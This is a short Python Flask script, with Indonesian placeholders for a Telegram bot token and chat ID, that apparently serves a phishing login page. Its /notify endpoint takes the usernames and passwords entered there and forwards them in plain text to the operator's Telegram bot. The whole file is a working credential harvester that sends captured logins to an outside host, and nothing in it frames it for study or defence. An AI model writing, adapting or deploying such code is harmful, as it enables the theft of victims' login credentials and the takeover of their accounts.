
from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = "ISI_TOKEN_BOTMU"
CHAT_ID = "ISI_CHAT_IDMU"

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/notify", methods=["POST"])
def notify():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    text = f"Login Baru:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text})
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(debug=True)
